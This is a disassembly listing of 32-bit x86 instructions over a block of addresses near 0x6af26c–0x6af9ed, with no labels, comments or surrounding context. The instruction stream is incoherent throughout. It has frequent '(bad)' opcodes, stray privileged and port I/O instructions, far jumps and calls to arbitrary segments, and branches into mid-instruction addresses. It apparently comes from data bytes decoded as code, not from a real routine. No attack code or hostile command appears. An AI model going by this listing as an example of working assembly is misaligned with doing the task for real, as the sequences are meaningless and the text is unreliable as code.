  6af26c:	stc    
  6af26d:	pop    ecx
  6af26e:	in     al,dx
  6af26f:	and    al,0x83
  6af271:	and    cl,BYTE PTR [esi]
  6af273:	fimul  DWORD PTR [esi+ebp*8]
  6af276:	pusha  
  6af277:	mov    bh,0x38
  6af279:	ror    bl,cl
  6af27b:	cli    
  6af27c:	sbb    al,0x49
  6af27e:	pusha  
  6af27f:	les    ebp,FWORD PTR [ebx+0x60cc1e14]
  6af285:	movzx  ebx,bx
  6af288:	mov    ebx,0x85ff2b32
  6af28d:	and    al,0xa7
  6af28f:	sbb    esp,DWORD PTR [ebp-0x194aec70]
  6af295:	push   ebx
  6af296:	mov    ebp,0x1181cc8
  6af29b:	(bad)  
  6af29c:	enter  0xe84d,0x68
  6af2a0:	push   es
  6af2a1:	int3   
  6af2a2:	les    esi,FWORD PTR [ebx-0x6]
  6af2a5:	call   0x8a34:0xd563b7fd
  6af2ac:	or     ebx,DWORD PTR [edx+eax*4]
  6af2af:	adc    BYTE PTR [esi],bh
  6af2b1:	ret    0x18f9
  6af2b4:	mov    DWORD PTR [ebp+ebp*1+0x6ba4890c],0xa26b4c20
  6af2bf:	mov    esp,ecx
  6af2c1:	sbb    ecx,DWORD PTR [esi-0x1cffc510]
  6af2c7:	sub    DWORD PTR [eax],ebx
  6af2c9:	mov    db2,esp
  6af2cc:	fbstp  TBYTE PTR [eax]
  6af2ce:	imul   esi,DWORD PTR [eax+0x18],0xffffff9b
  6af2d2:	gs repnz adc al,0x8d
  6af2d6:	outs   dx,WORD PTR ds:[esi]
  6af2d8:	cmp    bh,BYTE PTR [edi-0x4184d798]
  6af2de:	jmp    0x2010:0x6b570be3
  6af2e5:	inc    esi
  6af2e6:	jmp    0x2c5b1755
  6af2eb:	sbb    dh,BYTE PTR [eax+ecx*8]
  6af2ee:	sbb    DWORD PTR [ebx],ebx
  6af2f0:	dec    ecx
  6af2f1:	add    BYTE PTR [edi-0x8fd2d58],dh
  6af2f7:	xlat   BYTE PTR ds:[ebx]
  6af2f8:	lods   al,BYTE PTR ds:[esi]
  6af2f9:	mov    cl,0x78
  6af2fb:	mov    al,0x89
  6af2fd:	vmptrld QWORD PTR [ebx+edi*4+0x637d665]
  6af305:	and    ah,BYTE PTR [ebx-0x40]
  6af308:	add    eax,0x6c52fec0
  6af30d:	outs   dx,DWORD PTR ds:[esi]
  6af30e:	mov    cl,0x25
  6af310:	es icebp 
  6af312:	jbe    0x6af2a3
  6af314:	clc    
  6af315:	cld    
  6af316:	dec    edi
  6af317:	inc    edi
  6af318:	sbb    DWORD PTR [ebx-0x75],edx
  6af31b:	neg    DWORD PTR [esi-0x140b9c4e]
  6af321:	mov    ebp,0xecb4491d
  6af326:	mov    esp,0x3f0dc3db
  6af32b:	jno    0x6af344
  6af32d:	mov    bl,0x79
  6af32f:	bound  edi,QWORD PTR [edx]
  6af331:	adc    BYTE PTR [esi-0x73],dl
  6af334:	(bad)  
  6af335:	sub    eax,0x9f36016f
  6af33a:	aad    0x12
  6af33c:	(bad)  
  6af33e:	jecxz  0x6af33c
  6af340:	xchg   esi,eax
  6af341:	aaa    
  6af342:	jae    0x6af373
  6af344:	fst    QWORD PTR [edi]
  6af346:	mov    esi,0x5858360c
  6af34b:	pop    esi
  6af34c:	adc    eax,0x6b183a8c
  6af351:	and    eax,0x1cce9fb8
  6af356:	mov    ch,BYTE PTR ds:0x8bd5b6d3
  6af35c:	pop    ds
  6af35d:	int3   
  6af35e:	xchg   esp,eax
  6af35f:	repnz mov bl,0xc0
  6af362:	scas   eax,DWORD PTR es:[edi]
  6af363:	cmp    eax,esp
  6af365:	lahf   
  6af366:	xchg   BYTE PTR [esi+0x3a],ch
  6af369:	jge    0x6af370
  6af36b:	mov    edi,0x1d6962bb
  6af370:	jp     0x6af37d
  6af372:	retf   0xf571
  6af375:	and    BYTE PTR [ecx+0x4a],ch
  6af378:	inc    BYTE PTR ds:0x896b05ec
  6af37e:	add    eax,0xdbff17f
  6af383:	mov    al,0x79
  6af385:	or     eax,0x5fef9e93
  6af38a:	mov    bh,0xf4
  6af38c:	fimul  DWORD PTR [esi]
  6af38e:	fiadd  DWORD PTR [edi-0x6c9e3fa9]
  6af394:	pop    es
  6af395:	sbb    ah,BYTE PTR [ebp-0xb]
  6af398:	pop    ecx
  6af399:	xor    al,0x7b
  6af39b:	das    
  6af39c:	jmp    0x7ab:0x267ec1db
  6af3a3:	pop    ds
  6af3a4:	inc    ebp
  6af3a5:	xchg   ecx,eax
  6af3a6:	pop    ds
  6af3a7:	xor    al,0xe4
  6af3a9:	xchg   ecx,eax
  6af3aa:	loop   0x6af405
  6af3ac:	div    BYTE PTR [eax+0x75]
  6af3af:	inc    edi
  6af3b0:	or     esi,DWORD PTR [edi]
  6af3b2:	sbb    esp,DWORD PTR [eax-0x51]
  6af3b5:	js     0x6af414
  6af3b7:	cmp    eax,0x1781f049
  6af3bc:	adc    ebx,DWORD PTR [ecx+0x4b1095a2]
  6af3c2:	neg    BYTE PTR [edx-0x3370b189]
  6af3c8:	mov    ecx,0x647c624d
  6af3cd:	sti    
  6af3ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6af3cf:	bound  edx,QWORD PTR [edx+0x12]
  6af3d2:	js     0x6af40e
  6af3d4:	dec    esp
  6af3d5:	leave  
  6af3d6:	fdivr  DWORD PTR [esi]
  6af3d8:	push   0xffffffa3
  6af3da:	dec    edx
  6af3db:	jo     0x6af458
  6af3dd:	jmp    0x27311fb0
  6af3e2:	sub    BYTE PTR [esi+0xd],0xa2
  6af3e6:	es popa 
  6af3e8:	mov    bl,0xa4
  6af3ea:	fst    QWORD PTR [edi]
  6af3ec:	in     eax,0x62
  6af3ee:	jecxz  0x6af468
  6af3f0:	xor    eax,0xfd9f548f
  6af3f5:	or     ah,BYTE PTR [ecx+0x2b08ff34]
  6af3fb:	jmp    0xe74b0567
  6af400:	cld    
  6af401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6af402:	inc    edx
  6af403:	pushf  
  6af404:	push   ecx
  6af405:	test   eax,0x18b9941e
  6af40a:	cmp    al,0x9e
  6af40c:	ja     0x6af3fc
  6af40e:	gs mov ch,0xf6
  6af411:	push   esi
  6af412:	mov    al,0x62
  6af414:	mov    edx,0x2e65ec8
  6af419:	or     eax,DWORD PTR [ebp+0x65]
  6af41c:	push   ebp
  6af41d:	jb     0x6af49d
  6af41f:	int    0x79
  6af421:	enter  0xfdda,0x3f
  6af425:	or     eax,DWORD PTR [edi+0x77e12476]
  6af42b:	loop   0x6af491
  6af42d:	cwde   
  6af42e:	fnstsw WORD PTR [ebx-0x56945e49]
  6af434:	in     al,dx
  6af435:	popa   
  6af436:	inc    edx
  6af437:	imul   edi,DWORD PTR [eax-0x1f33e8c1],0x913abdde
  6af441:	test   al,0xa3
  6af443:	stc    
  6af444:	push   edx
  6af445:	adc    esp,edx
  6af447:	mov    ah,ah
  6af449:	xchg   ebp,eax
  6af44a:	jno    0x6af405
  6af44c:	cs dec eax
  6af44e:	dec    esp
  6af44f:	out    dx,al
  6af450:	jl     0x6af458
  6af452:	je     0x6af4a6
  6af454:	scas   eax,DWORD PTR es:[edi]
  6af455:	pusha  
  6af456:	lahf   
  6af457:	pushf  
  6af458:	stos   DWORD PTR es:[edi],eax
  6af459:	cmp    dl,BYTE PTR [ecx+0x1f7cd5dc]
  6af45f:	aas    
  6af460:	mov    ?,WORD PTR [ebp+0x5c138363]
  6af466:	arpl   bx,sp
  6af468:	cmp    DWORD PTR [edx+0x3d],eax
  6af46b:	je     0x6af4ae
  6af46d:	andnps xmm7,XMMWORD PTR [edi+0x4ff981cc]
  6af474:	xchg   ecx,eax
  6af475:	cwde   
  6af476:	xchg   ecx,eax
  6af477:	xor    al,0xb6
  6af479:	(bad)  
  6af47a:	jnp    0x6af44d
  6af47c:	jecxz  0x6af479
  6af47e:	jl     0x6af47a
  6af480:	imul   edx
  6af482:	xor    eax,0xcad1ede3
  6af487:	mov    ebp,gs
  6af489:	bound  ebx,QWORD PTR [ebx+0x1d]
  6af48c:	inc    esp
  6af48d:	lods   al,BYTE PTR ds:[esi]
  6af48e:	jmp    0x6af42c
  6af490:	cmp    eax,0x9e0a8525
  6af495:	pop    ebx
  6af496:	mov    ds:0xa7112b26,al
  6af49b:	outs   dx,BYTE PTR ds:[esi]
  6af49c:	outs   dx,DWORD PTR ds:[esi]
  6af49d:	mov    ebp,0xec7fc181
  6af4a2:	pusha  
  6af4a3:	mov    bh,0x4c
  6af4a5:	(bad)  
  6af4a6:	jno    0x6af42d
  6af4a8:	sbb    al,0xac
  6af4aa:	loope  0x6af4dc
  6af4ac:	ds jae 0x6af470
  6af4af:	dec    esp
  6af4b0:	xchg   esi,eax
  6af4b1:	sub    cl,BYTE PTR [edx]
  6af4b3:	mov    ah,0xac
  6af4b5:	fsub   QWORD PTR [edi]
  6af4b7:	pop    ecx
  6af4b8:	xor    bh,BYTE PTR [eax+0x7ae0dde7]
  6af4be:	lods   al,BYTE PTR ds:[esi]
  6af4bf:	mov    esp,DWORD PTR [eax]
  6af4c1:	add    al,BYTE PTR ds:[ebp-0x2c]
  6af4c5:	fs push es
  6af4c7:	ret    
  6af4c8:	cmp    al,0x2d
  6af4ca:	test   eax,0xa6faaf6c
  6af4cf:	sbb    BYTE PTR [edx-0x53d14206],0xe1
  6af4d6:	fdiv   QWORD PTR [eax]
  6af4d8:	mov    cl,0xd3
  6af4da:	cld    
  6af4db:	mov    ecx,0x11e25bdc
  6af4e0:	std    
  6af4e1:	neg    BYTE PTR [ebx]
  6af4e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6af4e4:	int    0x3c
  6af4e6:	js     0x6af559
  6af4e8:	je     0x6af477
  6af4ea:	popa   
  6af4eb:	dec    BYTE PTR [edi]
  6af4ed:	cwde   
  6af4ee:	dec    esi
  6af4ef:	and    DWORD PTR [eax+0xf2b6555],ebp
  6af4f5:	sub    al,0x93
  6af4f7:	inc    esi
  6af4f8:	js     0x6af56f
  6af4fa:	sub    esp,ebp
  6af4fc:	mov    ecx,0x12fce96f
  6af501:	jmp    0x9ec7:0xd46d3105
  6af508:	push   ebp
  6af509:	test   eax,0xdb58ec98
  6af50e:	loope  0x6af51a
  6af510:	jle    0x6af49c
  6af512:	cmp    cl,cl
  6af514:	loope  0x6af4e5
  6af516:	sbb    ecx,DWORD PTR [ebx-0x40be940]
  6af51c:	and    bh,BYTE PTR [esi+0x5113c6ca]
  6af522:	fmul   DWORD PTR [esi+0x2a6dc8e7]
  6af528:	and    ch,ch
  6af52a:	sbb    dh,bl
  6af52c:	mov    bh,0x63
  6af52e:	push   cs
  6af52f:	pop    ebx
  6af530:	hlt    
  6af531:	test   eax,0xb1181fe6
  6af536:	shl    DWORD PTR [esi],cl
  6af538:	inc    edx
  6af539:	mov    ebx,0x1d20eb00
  6af53e:	loope  0x6af5ad
  6af540:	xchg   ecx,eax
  6af541:	das    
  6af542:	outs   dx,DWORD PTR ds:[esi]
  6af543:	sbb    BYTE PTR [esi+0x62],ch
  6af546:	test   eax,0xa747beb9
  6af54b:	xchg   ecx,eax
  6af54c:	out    dx,al
  6af54d:	rol    DWORD PTR [edi+0x2b],1
  6af550:	pop    edx
  6af551:	push   0xa631a7ba
  6af556:	xchg   esi,eax
  6af557:	xor    al,0x2c
  6af559:	retf   
  6af55a:	dec    ecx
  6af55b:	cmc    
  6af55c:	(bad)  
  6af55d:	ins    DWORD PTR es:[edi],dx
  6af55e:	push   esi
  6af55f:	inc    esp
  6af560:	enter  0xebe1,0x32
  6af564:	scas   eax,DWORD PTR es:[edi]
  6af565:	pop    ebp
  6af566:	push   ebp
  6af567:	adc    eax,DWORD PTR [ebx]
  6af569:	in     eax,dx
  6af56a:	mov    eax,ds:0xa8bafebd
  6af56f:	cmp    DWORD PTR [edi-0x632a0871],0xffffff98
  6af576:	mov    ?,WORD PTR [ebp-0x16cd9760]
  6af57c:	ins    BYTE PTR es:[edi],dx
  6af57d:	out    dx,al
  6af57e:	xor    BYTE PTR ds:0x1245520b,ch
  6af584:	and    BYTE PTR [esi+0x43],0x7f
  6af588:	and    eax,0x3d8e2135
  6af58d:	call   0xee6ba1ad
  6af592:	fdiv   QWORD PTR [edx+eiz*2+0x1e]
  6af596:	adc    BYTE PTR [ebp-0xc],ah
  6af599:	sub    BYTE PTR [ebx-0x55],0x1b
  6af59d:	jns    0x6af5f2
  6af59f:	adc    al,0xed
  6af5a1:	leave  
  6af5a2:	or     dh,bh
  6af5a4:	(bad)  
  6af5a5:	call   0x8e59e12f
  6af5aa:	shl    BYTE PTR [edx+0x6ccc1953],0xa
  6af5b1:	dec    ebx
  6af5b2:	mov    cl,0x62
  6af5b4:	xchg   esi,eax
  6af5b5:	add    al,0xf9
  6af5b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6af5b8:	cmp    eax,0x25a8d4d6
  6af5bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6af5be:	jge    0x6af582
  6af5c0:	lock ins DWORD PTR es:[edi],dx
  6af5c2:	test   al,0x18
  6af5c4:	sub    ecx,DWORD PTR [ecx]
  6af5c6:	xchg   edi,eax
  6af5c7:	mov    eax,ds:0x3000b043
  6af5cc:	and    ah,cl
  6af5ce:	jecxz  0x6af61b
  6af5d0:	cmp    BYTE PTR ds:0xcac4131a,bl
  6af5d6:	mov    edi,0xed4bdfd
  6af5db:	and    DWORD PTR [ebp-0x693fb73c],ebx
  6af5e1:	jb     0x6af61c
  6af5e3:	lea    ebp,[ebx-0x7d1b24d4]
  6af5e9:	sbb    edx,DWORD PTR [ebx]
  6af5eb:	stc    
  6af5ec:	push   ecx
  6af5ed:	adc    al,0x54
  6af5ef:	adc    DWORD PTR [eax+edx*8+0x36],0xffffffe3
  6af5f4:	push   ecx
  6af5f5:	imul   eax,DWORD PTR [ebp+0x7d9b9668],0xfffffff5
  6af5fc:	xchg   esp,eax
  6af5fd:	xchg   esp,eax
  6af5fe:	mov    bh,0xcf
  6af600:	add    BYTE PTR [edx-0x3d],cl
  6af603:	pusha  
  6af604:	cmp    DWORD PTR ds:0xcac5aa91,0xffffffac
  6af60b:	add    BYTE PTR [eax-0x775d781b],al
  6af611:	cmp    al,0x93
  6af613:	mov    al,0xf2
  6af615:	outs   dx,BYTE PTR ds:[esi]
  6af616:	push   edi
  6af617:	dec    ebx
  6af618:	mov    dl,0xc3
  6af61a:	adc    bh,ch
  6af61c:	cli    
  6af61d:	shl    DWORD PTR [ebx-0x77ba02fe],cl
  6af623:	xchg   ecx,eax
  6af624:	sub    eax,0xdab3e051
  6af629:	mov    ch,0xc0
  6af62b:	aam    0xb1
  6af62d:	jmp    FWORD PTR [ebp-0x6c8c085a]
  6af633:	ret    
  6af634:	fdivr  st(5),st
  6af636:	cmp    edx,0x5a
  6af639:	xchg   ecx,eax
  6af63a:	or     edi,0x64
  6af63d:	jbe    0x6af679
  6af63f:	fldenv [edx-0x6b]
  6af642:	pop    esp
  6af643:	arpl   dx,sp
  6af645:	mov    ch,0x96
  6af647:	add    ch,BYTE PTR [ebp+ecx*4-0x35b9cb1]
  6af64e:	jo     0x6af6b9
  6af650:	inc    ebx
  6af651:	stos   BYTE PTR es:[edi],al
  6af652:	mov    ah,BYTE PTR [ebx-0x5ae3cea8]
  6af658:	stos   BYTE PTR es:[edi],al
  6af659:	outs   dx,DWORD PTR ds:[esi]
  6af65a:	dec    eax
  6af65b:	sub    al,cl
  6af65d:	sbb    DWORD PTR [ecx-0x4b16c7f9],0x42
  6af664:	xor    BYTE PTR es:[ebp-0x15],bl
  6af668:	jp     0x6af607
  6af66a:	inc    ebx
  6af66b:	repnz mov ch,BYTE PTR [ecx+0x415ea96]
  6af672:	sub    eax,0x9f95f5e7
  6af677:	adc    BYTE PTR [edx-0x48],0x8b
  6af67b:	cmp    BYTE PTR [edx+0x47],ch
  6af67e:	call   0x3ba8f131
  6af683:	mov    esp,0x80a1e6cd
  6af688:	mov    ds:0x990ae5ae,eax
  6af68d:	push   esi
  6af68e:	fild   DWORD PTR [edi-0x29]
  6af691:	push   esi
  6af692:	mov    al,0xfc
  6af694:	(bad)  
  6af695:	das    
  6af696:	pop    edi
  6af697:	and    DWORD PTR [ebx+0x39],ebp
  6af69a:	mov    ch,0xbf
  6af69c:	jge    0x6af669
  6af69e:	adc    DWORD PTR [eax+0x2109c665],0x6954ab19
  6af6a8:	call   0x6c56:0xcf1a965c
  6af6af:	sub    bh,ch
  6af6b1:	cld    
  6af6b2:	cmp    cl,dh
  6af6b4:	jge    0x6af6f7
  6af6b6:	sub    DWORD PTR [ebx-0x39ce54a3],esi
  6af6bc:	inc    ebx
  6af6bd:	mov    esi,0xbac9e8e5
  6af6c2:	xor    dh,BYTE PTR ds:0x738ccae7
  6af6c8:	lock repz bound ebx,QWORD PTR [si-0x80]
  6af6ce:	arpl   WORD PTR [eax],bp
  6af6d0:	or     eax,0xbb9448e8
  6af6d5:	inc    esi
  6af6d6:	and    dl,bh
  6af6d8:	mov    dh,ch
  6af6da:	popa   
  6af6db:	int3   
  6af6dc:	into   
  6af6dd:	and    DWORD PTR [eax+0x31bc9520],edi
  6af6e3:	pusha  
  6af6e4:	sbb    eax,0x8ec4d7c8
  6af6e9:	ret    0x83f7
  6af6ec:	punpckhwd mm5,QWORD PTR [ecx]
  6af6ef:	ins    BYTE PTR es:[edi],dx
  6af6f0:	retf   
  6af6f1:	fucom  st(2)
  6af6f3:	stos   BYTE PTR es:[edi],al
  6af6f4:	call   DWORD PTR [edi+0x33246ec9]
  6af6fa:	(bad)  
  6af6fb:	clc    
  6af6fc:	jecxz  0x6af6f9
  6af6fe:	cmp    al,0xc1
  6af700:	rcr    DWORD PTR [eax-0x5],1
  6af703:	ror    BYTE PTR [ebp-0x3e],1
  6af706:	rol    al,0x4c
  6af709:	and    eax,0xbd94c034
  6af70e:	sub    esi,esi
  6af710:	xor    dh,BYTE PTR [ebx-0x53]
  6af713:	or     DWORD PTR [ecx+0x30],ecx
  6af716:	out    dx,eax
  6af717:	test   DWORD PTR [ebp-0x29],0xbe725430
  6af71e:	in     eax,0xdc
  6af720:	sar    DWORD PTR ds:0xdf546255,cl
  6af726:	fld    TBYTE PTR [ebx]
  6af728:	mov    ecx,0x11b1b0d6
  6af72d:	cdq    
  6af72e:	add    esi,esi
  6af730:	mov    dl,0xb0
  6af732:	aaa    
  6af733:	fdiv   QWORD PTR [ebx+edx*2+0x49011234]
  6af73a:	lods   al,BYTE PTR ds:[esi]
  6af73b:	out    0x42,eax
  6af73d:	cmp    BYTE PTR [edi+0x56172ab8],ch
  6af743:	add    eax,0x66d44f00
  6af748:	popf   
  6af749:	es test eax,0xfc412366
  6af74f:	sbb    ch,cl
  6af751:	lea    ebp,[eax+0x55d6887d]
  6af757:	mov    dl,0xdd
  6af759:	fldcw  WORD PTR [ebp+0x3]
  6af75c:	mov    dl,BYTE PTR [esp+ecx*2-0x51]
  6af760:	daa    
  6af761:	inc    eax
  6af762:	lods   al,BYTE PTR ds:[esi]
  6af763:	sbb    esp,esi
  6af765:	xchg   ecx,eax
  6af766:	aad    0x25
  6af768:	cmp    dh,BYTE PTR [ebx+0x6400de40]
  6af76e:	ins    BYTE PTR es:[edi],dx
  6af76f:	and    ah,BYTE PTR [ecx+0x6d0627b1]
  6af775:	shl    BYTE PTR [ebp+0x24f0ce48],0x7a
  6af77c:	or     dh,BYTE PTR [eax]
  6af77e:	mov    edx,0x5a364eec
  6af783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6af784:	jmp    0x6af780
  6af786:	sbb    ebp,DWORD PTR [ecx-0x38bbae8e]
  6af78c:	mov    ah,0x67
  6af78e:	or     eax,0x8f77ce9b
  6af793:	or     BYTE PTR [ebp-0x12],ah
  6af796:	scas   eax,DWORD PTR es:[edi]
  6af797:	or     DWORD PTR [ebp+0x64ac10e6],ebp
  6af79d:	icebp  
  6af79e:	mov    ecx,0x768269d2
  6af7a3:	repnz or dh,bh
  6af7a6:	das    
  6af7a7:	ror    DWORD PTR [ecx+0x5c],cl
  6af7aa:	cmp    ebx,ebx
  6af7ac:	out    0x75,eax
  6af7ae:	ret    0xbb24
  6af7b1:	fst    DWORD PTR [edi]
  6af7b3:	in     eax,dx
  6af7b4:	push   ds
  6af7b5:	dec    ebx
  6af7b6:	inc    ecx
  6af7b7:	and    ah,ch
  6af7b9:	fidiv  WORD PTR fs:[esp+eax*2]
  6af7bd:	or     eax,0x327169ae
  6af7c2:	nop
  6af7c3:	retf   
  6af7c4:	sar    DWORD PTR ds:0x81796ca7,0x91
  6af7cb:	(bad)  
  6af7cc:	ins    BYTE PTR es:[edi],dx
  6af7cd:	fcmovnu st,st(4)
  6af7cf:	fwait
  6af7d0:	cli    
  6af7d1:	shl    ecx,0x82
  6af7d4:	xchg   DWORD PTR [eax],ebp
  6af7d6:	mov    ebp,0xb31eec27
  6af7db:	scas   eax,DWORD PTR es:[edi]
  6af7dc:	xchg   DWORD PTR [eax],ecx
  6af7de:	fs repnz mov dl,0xdb
  6af7e2:	mov    ebx,0x878f6d35
  6af7e7:	aad    0x62
  6af7e9:	shr    BYTE PTR [edi],0x33
  6af7ec:	into   
  6af7ed:	add    esi,DWORD PTR [esi+0x79b4d805]
  6af7f3:	fwait
  6af7f4:	dec    eax
  6af7f5:	cli    
  6af7f6:	js     0x6af7f0
  6af7f8:	repz sub DWORD PTR ds:0x9df51684,0xffffffc7
  6af800:	leave  
  6af801:	test   al,bh
  6af803:	div    BYTE PTR [esi+0x1a]
  6af806:	mov    ds:0x125b0fdf,eax
  6af80b:	cmp    edx,esi
  6af80d:	jmp    0x6af79d
  6af80f:	push   ss
  6af810:	retf   
  6af811:	out    dx,eax
  6af812:	je     0x6af7ec
  6af814:	xchg   ecx,eax
  6af815:	addr16 es jle 0x6af86a
  6af819:	clc    
  6af81a:	cmp    al,BYTE PTR [ecx-0xf73290a]
  6af820:	icebp  
  6af821:	dec    esi
  6af822:	scas   eax,DWORD PTR es:[edi]
  6af823:	mov    ds:0x8ca77b30,eax
  6af828:	cmp    eax,DWORD PTR [edi-0xa]
  6af82b:	mov    dl,0x85
  6af82d:	in     al,dx
  6af82e:	rcr    BYTE PTR [esi+0x31],1
  6af831:	pop    eax
  6af832:	fcmovb st,st(6)
  6af834:	stos   BYTE PTR es:[edi],al
  6af835:	rcl    BYTE PTR [edi-0x79],1
  6af838:	in     al,dx
  6af839:	mov    eax,ds:0xc6c4a5e3
  6af83e:	outs   dx,BYTE PTR ds:[esi]
  6af83f:	inc    edi
  6af840:	xchg   BYTE PTR [eax+0x6ff485af],ch
  6af846:	icebp  
  6af847:	inc    eax
  6af848:	fnsave [ecx+0x59]
  6af84b:	dec    ebp
  6af84c:	jecxz  0x6af81c
  6af84e:	pop    ebp
  6af84f:	sub    dl,BYTE PTR [ebx-0x6ec1e46]
  6af855:	gs xchg esp,eax
  6af857:	inc    ecx
  6af858:	cmc    
  6af859:	out    dx,al
  6af85a:	sbb    ecx,DWORD PTR [eax+0x5e]
  6af85d:	loope  0x6af8a1
  6af85f:	or     DWORD PTR [edx],edx
  6af861:	cmp    DWORD PTR [ebx],esi
  6af863:	adc    edi,esi
  6af865:	lods   al,BYTE PTR ds:[esi]
  6af866:	(bad)  
  6af867:	imul   ebp,edi,0x43ac3809
  6af86d:	cmp    al,0x3b
  6af86f:	xor    eax,0xd42cac61
  6af874:	call   0xfd01:0xb9d060e3
  6af87b:	push   edi
  6af87c:	jo     0x6af8b2
  6af87e:	loop   0x6af804
  6af880:	pusha  
  6af881:	cmp    al,0x24
  6af883:	hlt    
  6af884:	jg     0x6af860
  6af886:	in     al,0x11
  6af888:	ins    DWORD PTR es:[edi],dx
  6af889:	pop    eax
  6af88a:	scas   eax,DWORD PTR es:[edi]
  6af88b:	out    0xcf,eax
  6af88d:	sub    cl,BYTE PTR [ebp+edx*8+0x53]
  6af891:	int    0xe
  6af893:	jle    0x6af892
  6af895:	xchg   ecx,eax
  6af896:	push   esp
  6af897:	hlt    
  6af898:	xchg   edx,eax
  6af899:	add    DWORD PTR [ecx+ecx*2-0x15],esp
  6af89d:	and    BYTE PTR [ebx-0x30],al
  6af8a0:	jns    0x6af8f2
  6af8a2:	dec    ecx
  6af8a3:	mov    esp,0x9926fba
  6af8a8:	push   cs
  6af8a9:	lods   eax,DWORD PTR ds:[esi]
  6af8aa:	dec    esi
  6af8ab:	daa    
  6af8ac:	ficomp DWORD PTR [ebp+esi*2-0x475ed491]
  6af8b3:	pushf  
  6af8b4:	fnstsw WORD PTR [ecx-0x4e]
  6af8b7:	test   al,0x16
  6af8b9:	mov    ebp,0x1a1db876
  6af8be:	fild   QWORD PTR [ebx]
  6af8c0:	jne    0x6af8b1
  6af8c2:	xor    bl,BYTE PTR [edi+0x69]
  6af8c5:	cdq    
  6af8c6:	arpl   WORD PTR [ebp+ebp*2+0x70a82726],ax
  6af8cd:	loop   0x6af87a
  6af8cf:	mov    ds:0x7cf7ea73,al
  6af8d4:	shl    DWORD PTR [edx],cl
  6af8d6:	push   ebp
  6af8d7:	jne    0x6af8b3
  6af8d9:	ds push es
  6af8db:	jnp    0x6af8d8
  6af8dd:	sub    al,0xa9
  6af8df:	dec    edi
  6af8e0:	push   0x6bf1e572
  6af8e5:	fild   WORD PTR [edi]
  6af8e7:	fwait
  6af8e8:	xchg   edx,eax
  6af8e9:	div    ebx
  6af8eb:	inc    esi
  6af8ec:	(bad)  [edi+0x21fe1551]
  6af8f2:	or     bl,ch
  6af8f4:	jg     0x6af94d
  6af8f6:	adc    BYTE PTR [ecx-0x5a],dl
  6af8f9:	adc    esi,DWORD PTR [eax]
  6af8fb:	sbb    edx,DWORD PTR [eax-0xc]
  6af8fe:	out    dx,al
  6af8ff:	add    al,0x65
  6af901:	pop    ds
  6af902:	out    0xdf,al
  6af904:	ds fs pop edx
  6af907:	pop    ds
  6af908:	dec    ebp
  6af909:	fcomip st,st(5)
  6af90b:	out    dx,al
  6af90c:	cwde   
  6af90d:	repnz dec ebx
  6af90f:	push   esi
  6af910:	dec    edx
  6af911:	jge    0x6af992
  6af913:	mov    al,ds:0x3da2c3d8
  6af918:	jmp    0xbb16fa60
  6af91d:	je     0x6af8fa
  6af91f:	push   ss
  6af920:	inc    ecx
  6af921:	or     esp,ebx
  6af923:	xchg   edi,eax
  6af924:	xchg   ebp,eax
  6af925:	cmc    
  6af926:	jne    0x6af90f
  6af928:	xchg   ecx,eax
  6af929:	adc    esi,DWORD PTR [ebp+0x51]
  6af92c:	sti    
  6af92d:	fs inc edi
  6af92f:	adc    BYTE PTR [edx],dl
  6af931:	lds    ebx,FWORD PTR ds:0x4b211b0b
  6af937:	mov    bl,0xa6
  6af939:	cwde   
  6af93a:	pop    ecx
  6af93b:	inc    ebp
  6af93c:	(bad)  
  6af93d:	pop    esp
  6af93e:	(bad)  
  6af93f:	jnp    0x6af98c
  6af941:	push   0xffffff98
  6af943:	adc    eax,0xb386deb0
  6af948:	add    eax,0x9da21e73
  6af94d:	ficom  WORD PTR [edi]
  6af94f:	out    0x2c,al
  6af951:	(bad)  
  6af952:	stos   DWORD PTR es:[edi],eax
  6af953:	fisub  DWORD PTR [esi]
  6af955:	call   0xbae2:0xcbbd3132
  6af95c:	xchg   edx,eax
  6af95d:	scas   al,BYTE PTR es:[edi]
  6af95e:	mov    bh,0xeb
  6af960:	xor    ecx,DWORD PTR [edx+0x5]
  6af963:	es mov dl,al
  6af966:	fistp  WORD PTR [edi+0x40e66142]
  6af96c:	inc    ebp
  6af96d:	lock sahf 
  6af96f:	pop    esp
  6af970:	and    edi,DWORD PTR [ebx]
  6af972:	dec    ebp
  6af973:	sti    
  6af974:	mov    BYTE PTR [edi-0x7c],bl
  6af977:	leave  
  6af978:	ret    0xb11e
  6af97b:	in     eax,dx
  6af97c:	ds fwait
  6af97e:	mov    esi,DWORD PTR ds:0xb970bb17
  6af984:	(bad)  
  6af985:	(bad)  
  6af986:	cmp    DWORD PTR [eax-0x5b58edfd],esi
  6af98c:	push   ebx
  6af98d:	or     ecx,edx
  6af98f:	mov    eax,0x225e3aea
  6af994:	stos   DWORD PTR es:[edi],eax
  6af995:	imul   ebp,DWORD PTR [ebp-0x4b6aa48e],0x17d0c7e8
  6af99f:	leave  
  6af9a0:	push   ebp
  6af9a1:	xchg   ebp,eax
  6af9a2:	sub    al,0x22
  6af9a4:	popf   
  6af9a5:	call   0x7fc6:0x240623a0
  6af9ac:	outs   dx,BYTE PTR ds:[esi]
  6af9ad:	inc    edx
  6af9ae:	iret   
  6af9af:	ins    DWORD PTR es:[edi],dx
  6af9b0:	xlat   BYTE PTR ds:[ebx]
  6af9b1:	ins    BYTE PTR es:[edi],dx
  6af9b2:	pop    esi
  6af9b3:	pop    ds
  6af9b4:	retf   0x9f
  6af9b7:	cdq    
  6af9b8:	das    
  6af9b9:	out    0x94,al
  6af9bb:	adc    esp,edx
  6af9bd:	mov    ds:0x58ffbe38,al
  6af9c2:	jmp    0x22d:0x1012e87
  6af9c9:	aas    
  6af9ca:	lock sub ecx,ebx
  6af9cd:	int3   
  6af9ce:	mov    edi,0x5d729f5e
  6af9d3:	inc    eax
  6af9d4:	dec    edi
  6af9d5:	sub    DWORD PTR [edx],ecx
  6af9d7:	aas    
  6af9d8:	fidivr DWORD PTR [ecx-0x425b15e1]
  6af9de:	pop    ds
  6af9df:	enter  0x7460,0x36
  6af9e3:	jno    0x6af97d
  6af9e5:	pop    esi
  6af9e6:	push   ebx
  6af9e7:	xor    eax,0x60354b82
  6af9ec:	pop    es
  6af9ed:	lock mul BYTE PTR [esi+eiz*2+0x43]
